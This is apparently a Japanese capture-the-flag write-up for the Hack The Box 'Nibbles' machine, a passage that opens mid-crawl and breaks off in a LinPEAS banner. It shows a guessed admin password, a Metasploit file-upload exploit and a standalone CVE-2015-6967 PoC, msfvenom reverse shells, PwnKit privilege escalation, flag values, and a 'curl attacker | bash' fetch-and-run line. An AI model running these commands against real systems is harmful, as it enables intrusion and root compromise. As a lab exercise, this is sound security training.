2025-04-26 06:41:54 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=M;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=M;O=D" [1]
2025-04-26 06:41:55 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=S;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=S;O=D" [1]
2025-04-26 06:41:55 URL:http://10.129.96.84/nibbleblog/content/public/pages/?C=D;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/pages/index.html?C=D;O=D" [1]
2025-04-26 06:41:55 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=N;O=A [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=N;O=A" [1]
2025-04-26 06:41:56 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=M;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=M;O=D" [1]
2025-04-26 06:41:56 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=S;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=S;O=D" [1]
2025-04-26 06:41:56 URL:http://10.129.96.84/nibbleblog/content/public/posts/?C=D;O=D [817/817] -> "10.129.96.84/nibbleblog/content/public/posts/index.html?C=D;O=D" [1]
2025-04-26 06:41:57 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=N;O=A [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=N;O=A" [1]
2025-04-26 06:41:57 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=M;O=D [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=M;O=D" [1]
2025-04-26 06:41:57 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=S;O=D [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=S;O=D" [1]
2025-04-26 06:41:58 URL:http://10.129.96.84/nibbleblog/content/public/upload/?C=D;O=D [1469/1469] -> "10.129.96.84/nibbleblog/content/public/upload/index.html?C=D;O=D" [1]
2025-04-26 06:41:58 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=N;O=A [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=N;O=A" [1]
2025-04-26 06:41:58 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=M;O=D [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=M;O=D" [1]
2025-04-26 06:41:58 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=S;O=D [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=S;O=D" [1]
2025-04-26 06:41:59 URL:http://10.129.96.84/nibbleblog/content/private/plugins/categories/?C=D;O=D [1047/1047] -> "10.129.96.84/nibbleblog/content/private/plugins/categories/index.html?C=D;O=D" [1]
2025-04-26 06:41:59 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=N;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=N;O=A" [1]
2025-04-26 06:41:59 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=M;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=M;O=D" [1]
2025-04-26 06:42:00 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=S;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=S;O=D" [1]
2025-04-26 06:42:00 URL:http://10.129.96.84/nibbleblog/content/private/plugins/hello/?C=D;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/hello/index.html?C=D;O=D" [1]
2025-04-26 06:42:00 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=N;O=A [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=N;O=A" [1]
2025-04-26 06:42:01 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=M;O=D [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=M;O=D" [1]
2025-04-26 06:42:01 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=S;O=D [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=S;O=D" [1]
2025-04-26 06:42:01 URL:http://10.129.96.84/nibbleblog/content/private/plugins/latest_posts/?C=D;O=D [1051/1051] -> "10.129.96.84/nibbleblog/content/private/plugins/latest_posts/index.html?C=D;O=D" [1]
2025-04-26 06:42:01 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=N;O=A [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=N;O=A" [1]
2025-04-26 06:42:02 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=M;O=D [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=M;O=D" [1]
2025-04-26 06:42:02 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=S;O=D [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=S;O=D" [1]
2025-04-26 06:42:02 URL:http://10.129.96.84/nibbleblog/content/private/plugins/my_image/?C=D;O=D [1043/1043] -> "10.129.96.84/nibbleblog/content/private/plugins/my_image/index.html?C=D;O=D" [1]
2025-04-26 06:42:03 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=N;O=A [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=N;O=A" [1]
2025-04-26 06:42:03 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=M;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=M;O=D" [1]
2025-04-26 06:42:03 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=S;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=S;O=D" [1]
2025-04-26 06:42:03 URL:http://10.129.96.84/nibbleblog/content/private/plugins/pages/?C=D;O=D [1037/1037] -> "10.129.96.84/nibbleblog/content/private/plugins/pages/index.html?C=D;O=D" [1]
FINISHED --2025-04-26 06:42:03--
Total wall clock time: 55s
Downloaded: 164 files, 409K in 3.1s (132 KB/s)

                                                                                                                                                                                                                                            
└─$ grep -r 'username' 10.129.96.84/nibbleblog/content
10.129.96.84/nibbleblog/content/private/users.xml:<users><user username="admin"><id type="integer">0</id><session_fail_count type="integer">0</session_fail_count><session_date type="integer">1745654677</session_date></user><blacklist type="string" ip="10.10.10.1"><date type="integer">1512964659</date><fail_count type="integer">1</fail_count></blacklist><blacklist type="string" ip="10.10.14.109"><date type="integer">1745660349</date><fail_count type="integer">1</fail_count></blacklist></users>


└─$ grep -r 'password' 10.129.96.84/nibbleblog/content

```
guess問でした、パスワードは「nibbles」  
ログイン成功  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Nibbles_05.png" width="100%" height="100%">



# SOLUTION 1
USE METASPLOIT
## STEP 3
metasploitで検索すると、ファイルアップロードの脆弱性を確認  
エクスプロイト実行成功！ユーザフラグゲット！ルートフラグは権限足らず
```sh
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.96.84
RHOSTS => 10.129.96.84

msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI nibbleblog
TARGETURI => nibbleblog

msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin

msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles

msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
LHOST => 10.10.14.109

msf6 exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.109:4444 
[*] Sending stage (40004 bytes) to 10.129.96.84
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.109:4444 -> 10.129.96.84:39940) at 2025-04-26 07:18:33 -0400

meterpreter >

meterpreter > cat /home/nibbler/user.txt
2143c34c53c74de61178e145a81eb812

meterpreter > ls root
[-] stdapi_fs_stat: Operation failed: 1
```


## STEP 4
EoPを調査！が、PHPのリバースシェル上では`post/multi/recon/local_exploit_suggester`を使用できないっぽいので別のリバースシェルを取り直す
```sh
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.129.96.84 - Collecting local exploits for php/linux...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[-] 10.129.96.84 - No suggestions available
```
`msfvenom`でリバースシェル作成
```sh
└─$ msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=5555 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
```
リバースシェル配送・実行
```sh
meterpreter > pwd
/var/www/html/nibbleblog/content/private/plugins/my_image

meterpreter > upload /home/kali/htb/shell .
[*] Uploading  : /home/kali/htb/shell -> ./shell
[*] Completed  : /home/kali/htb/shell -> ./shell

meterpreter > ls -l shell
100644/rw-r--r--  250  fil  2025-04-26 07:32:44 -0400  shell

meterpreter > chmod 777 shell

meterpreter > ls -l shell
100777/rwxrwxrwx  250  fil  2025-04-26 07:32:44 -0400  shell

meterpreter > shell
Process 17517 created.
Channel 2 created.

./shell
```
リバースシェル獲得！EoP調査
```sh
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.109

msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.109:5555 
[*] Sending stage (3045380 bytes) to 10.129.96.84
[*] Meterpreter session 1 opened (10.10.14.109:5555 -> 10.129.96.84:45914) at 2025-04-26 07:39:38 -0400

meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.129.96.84 - Collecting local exploits for x64/linux...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.129.96.84 - 204 exploit checks are being tried...
[+] 10.129.96.84 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 10.129.96.84 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 10.129.96.84 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 10.129.96.84 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 10.129.96.84 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-104-generic is vulnerable
[+] 10.129.96.84 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 10.129.96.84 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 10.129.96.84 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 10.129.96.84 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 10.129.96.84 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.16 is a vulnerable build.
[*] Running check method for exploit 73 / 73
[*] 10.129.96.84 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 4   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-104-generic is vulnerable
 6   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 8   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 9   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 10  exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.16 is a vulnerable build.
 11  exploit/linux/local/abrt_raceabrt_priv_esc                          No                       The target is not exploitable.
 12  exploit/linux/local/abrt_sosreport_priv_esc                         No                       The target is not exploitable.
 13  exploit/linux/local/af_packet_chocobo_root_priv_esc                 No                       The target is not exploitable. Linux kernel 4.4.0-104-generic #127-Ubuntu is not vulnerable
 14  exploit/linux/local/af_packet_packet_set_ring_priv_esc              No                       The target is not exploitable.
 15  exploit/linux/local/ansible_node_deployer                           No                       The target is not exploitable. Ansible does not seem to be installed, unable to find ansible executable
 16  exploit/linux/local/apport_abrt_chroot_priv_esc                     No                       The target is not exploitable.
 17  exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc          No                       The target is not exploitable.
 18  exploit/linux/local/bpf_priv_esc                                    No                       The target is not exploitable.
 19  exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe       No                       Cannot reliably check exploitability. Unknown target kernel version, recommend manually checking if target kernel is vulnerable.
 20  exploit/linux/local/cve_2021_38648_omigod                           No                       The target is not exploitable. The omiserver process was not found.
 21  exploit/linux/local/cve_2022_0847_dirtypipe                         No                       The target is not exploitable. Linux kernel version 4.4.0 is not vulnerable
 22  exploit/linux/local/cve_2022_1043_io_uring_priv_esc                 No                       The target is not exploitable.
 23  exploit/linux/local/cve_2023_0386_overlayfs_priv_esc                No                       The target is not exploitable. Linux kernel version 4.4.0 is not vulnerable
 24  exploit/linux/local/desktop_privilege_escalation                    No                       The target is not exploitable.
 25  exploit/linux/local/diamorphine_rootkit_signal_priv_esc             No                       The target is not exploitable. Diamorphine is not installed, or incorrect signal '64'
 26  exploit/linux/local/docker_daemon_privilege_escalation              No                       The target is not exploitable.
 27  exploit/linux/local/docker_privileged_container_escape              No                       The target is not exploitable. Not inside a Docker container
 28  exploit/linux/local/exim4_deliver_message_priv_esc                  No                       The target is not exploitable.
 29  exploit/linux/local/gameoverlay_privesc                             No                       The check raised an exception.
 30  exploit/linux/local/glibc_ld_audit_dso_load_priv_esc                No                       The target is not exploitable.
 31  exploit/linux/local/glibc_origin_expansion_priv_esc                 No                       The target is not exploitable. GNU C Library version 2.23 is not vulnerable
 32  exploit/linux/local/glibc_tunables_priv_esc                         No                       The target is not exploitable. The glibc version (2.23-0ubuntu9) found on the target does not appear to be vulnerable
 33  exploit/linux/local/hp_xglance_priv_esc                             No                       The target is not exploitable. /opt/perf/bin/xglance-bin file not found
 34  exploit/linux/local/juju_run_agent_priv_esc                         No                       The target is not exploitable.
 35  exploit/linux/local/ktsuss_suid_priv_esc                            No                       The target is not exploitable. /usr/bin/ktsuss file not found
 36  exploit/linux/local/lastore_daemon_dbus_priv_esc                    No                       The target is not exploitable.
 37  exploit/linux/local/libuser_roothelper_priv_esc                     No                       The target is not exploitable. /usr/sbin/userhelper file not found
 38  exploit/linux/local/nested_namespace_idmap_limit_priv_esc           No                       The target is not exploitable.
 39  exploit/linux/local/netfilter_nft_set_elem_init_privesc             No                       The target is not exploitable.
 40  exploit/linux/local/netfilter_priv_esc_ipv4                         No                       The target is not exploitable.
 41  exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc       No                       The target is not exploitable. The ip_tables module is not loaded.
 42  exploit/linux/local/network_manager_vpnc_username_priv_esc          No                       The target is not exploitable.
 43  exploit/linux/local/ntfs3g_priv_esc                                 No                       The target is not exploitable.
 44  exploit/linux/local/omniresolve_suid_priv_esc                       No                       The target is not exploitable. /opt/omni/lbin/omniresolve file not found
 45  exploit/linux/local/overlayfs_priv_esc                              No                       The target is not exploitable.
 46  exploit/linux/local/progress_flowmon_sudo_privesc_2024              No                       The target is not exploitable.
 47  exploit/linux/local/progress_kemp_loadmaster_sudo_privesc_2024      No                       The target is not exploitable. Found 0 indicators this is a KEMP product
 48  exploit/linux/local/ptrace_sudo_token_priv_esc                      No                       The target is not exploitable.
 49  exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc  No                       The target is not exploitable. Linux kernel 4.4.0-104-generic #127-Ubuntu is not vulnerable
 50  exploit/linux/local/rds_rds_page_copy_user_priv_esc                 No                       The target is not exploitable. Linux kernel version 4.4.0-104-generic is not vulnerable
 51  exploit/linux/local/recvmmsg_priv_esc                               No                       The target is not exploitable.
 52  exploit/linux/local/reptile_rootkit_reptile_cmd_priv_esc            No                       The target is not exploitable.
 53  exploit/linux/local/runc_cwd_priv_esc                               No                       The target is not exploitable. The runc command was not found on this system
 54  exploit/linux/local/saltstack_salt_minion_deployer                  No                       The target is not exploitable. salt-master does not seem to be installed, unable to find salt-master executable
 55  exploit/linux/local/servu_ftp_server_prepareinstallation_priv_esc   No                       The target is not exploitable. /usr/local/Serv-U/Serv-U file not found
 56  exploit/linux/local/sudoedit_bypass_priv_esc                        No                       The check raised an exception.
 57  exploit/linux/local/systemtap_modprobe_options_priv_esc             No                       The target is not exploitable. /usr/bin/staprun file not found
 58  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                 No                       The check raised an exception.
 59  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                 No                       The target is not exploitable. Error processing Tomcat version (packages) into known format: Malformed version number string packages
 60  exploit/linux/local/ubuntu_enlightenment_mount_priv_esc             No                       The target is not exploitable. An exploitable enlightenment_sys was not found on the system
 61  exploit/linux/local/ubuntu_needrestart_lpe                          No                       The target is not exploitable. needrestart binary not found
 62  exploit/linux/local/ufo_privilege_escalation                        No                       The target is not exploitable.
 63  exploit/linux/local/vcenter_java_wrapper_vmon_priv_esc              No                       The target is not exploitable. /usr/lib/vmware-vmon/java-wrapper-vmon not found on system
 64  exploit/linux/local/vcenter_sudo_lpe                                No                       The target is not exploitable. Unable to determine vcenter build from output:
 65  exploit/linux/local/vmware_alsa_config                              No                       The target is not exploitable.
 66  exploit/linux/local/vmware_workspace_one_access_certproxy_lpe       No                       The target is not exploitable. Not running as the horizon user.
 67  exploit/linux/local/vmware_workspace_one_access_cve_2022_22960      No                       The target is not exploitable. Not running as the horizon user.
 68  exploit/linux/local/vmwgfx_fd_priv_esc                              No                       The target is not exploitable. Kernel version 4.4.0-104-generic is not vulnerable
 69  exploit/linux/local/zimbra_postfix_priv_esc                         No                       The target is not exploitable.
 70  exploit/linux/local/zimbra_slapper_priv_esc                         No                       The target is not exploitable.
 71  exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc          No                       The target is not exploitable. Directory '/opt/sysinfo' does not exist
 72  exploit/multi/local/xorg_x11_suid_server                            No                       The target is not exploitable.
 73  exploit/multi/local/xorg_x11_suid_server_modulepath                 No                       The target is not exploitable.
```
`exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`で権限昇格成功、ルートフラグ取得  
ちなみに`exploit/linux/local/glibc_realpath_priv_esc`でも権限昇格できた
```sh
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         meterpreter x64/linux  nibbler @ 10.129.96.84  10.10.14.109:5555 -> 10.129.96.84:45914 (10.129.96.84)

msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PKEXEC_PATH                    no        The path to pkexec binary
   SESSION                        yes       The session to run this module on
   WRITABLE_DIR  /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86_64



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
SESSION => 1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST tun0
LHOST => 10.10.14.109

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
[*] Started reverse TCP handler on 10.10.14.109:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.opcrmkjwua
[+] The target is vulnerable.
[*] Writing '/tmp/.omjoqa/owplmpwih/owplmpwih.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.omjoqa
[*] Sending stage (3045380 bytes) to 10.129.96.84
[+] Deleted /tmp/.omjoqa/owplmpwih/owplmpwih.so
[+] Deleted /tmp/.omjoqa/.xwkpiy
[*] Meterpreter session 2 opened (10.10.14.109:4444 -> 10.129.96.84:39948) at 2025-04-26 07:53:37 -0400

meterpreter > getuid
Server username: root

meterpreter > cat /root/root.txt 
a042d31cafc2461bbf2ba0b2c99fdca8
```



# SOLUTION 2
NO METASPLOIT
## STEP 3
NibbleBlogのプラグイン「My image」には画像ファイル以外にPHPをアップロードできる脆弱性「CVE-2015-6967」が存在する  
PoCがあるのでダウンロードし実行  
PHPは[Reverse Shell Generator](https://www.revshells.com/)のPentestMonkeyを使用
```sh
└─$ wget https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
--2025-04-26 07:00:50--  https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1932 (1.9K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   1.89K  --.-KB/s    in 0s      

2025-04-26 07:00:51 (52.1 MB/s) - ‘exploit.py’ saved [1932/1932]


└─$ python3.13 exploit.py
usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD
exploit.py: error: the following arguments are required: --url/-l, --username/-u, --password/-p, --payload/-x


└─$ python3.13 exploit.py -l http://10.129.96.84/nibbleblog/ -u admin -p nibbles -x shell.php
[+] Login Successful.
[+] Upload likely successfull.
[+] Exploit launched, check for shell.


└─$ curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
```
リバースシェル取得！
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.96.84] 39992
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:22:37 up  9:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
bash: cannot set terminal process group (1347): Inappropriate ioctl for device
bash: no job control in this shell

nibbler@Nibbles:/$ tty
tty
not a tty

nibbler@Nibbles:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

nibbler@Nibbles:/$ tty
tty
/dev/pts/2
```
EoPのためにLinPEASを配送、KaliのPythonのWebサーバにアップロード
```sh
└─$ cp /usr/share/peass/linpeas/linpeas.sh . 
                                                                                                                                                                                                                                            

└─$ python3.13 -m http.server 80                                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
linPEASを実行、実行結果を書き込み権限のある「/var/www/html/nibbleblog」に出力
```sh
nibbler@Nibbles:/$ find / -type d -writable 2> /dev/null
find / -type d -writable 2> /dev/null
/var/www/html/nibbleblog
/var/crash
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/lib/php/sessions
/var/tmp
/run/lock
/run/lock/apache2
/home/nibbler
/home/nibbler/.nano
/dev/mqueue
/dev/shm
/tmp
/tmp/personal
/tmp/personal/stuff
/tmp/.ICE-unix
/tmp/a
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/proc/20980/task/20980/fd
/proc/20980/fd
/proc/20980/map_files


nibbler@Nibbles:/$ curl http://10.10.14.109/linpeas.sh | /bin/bash > /var/www/html/nibbleblog/peas.txt
<p://10.10.14.109/linpeas.sh | /bin/bash > /var/www/html/nibbleblog/peas.txt 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
 32  820k   32  268k    0     0  32374      0  0:00:25  0:00:08  0:00:17 32374uniq: write error: Broken pipe. . . . . . . . . . . . . . . . . . . . . . . . . . . . 
 46  820k   46  380k    0     0  41751      0  0:00:20  0:00:09  0:00:11 41751cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
 79  820k   79  652k    0     0  30901      0  0:00:27  0:00:21  0:00:06 31685sed: -e expression #1, char 0: no previous regular expression
100  820k  100  820k    0     0  12292      0  0:01:08  0:01:08 --:--:--  3852
logrotate 3.8.7
```
LinPEASの実行結果を出力したディレクトリパスは、WebサーバにホスティングされているのでKaliから直接参照できる
```sh
└─$ curl http://10.129.96.84/nibbleblog/peas.txt | cat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
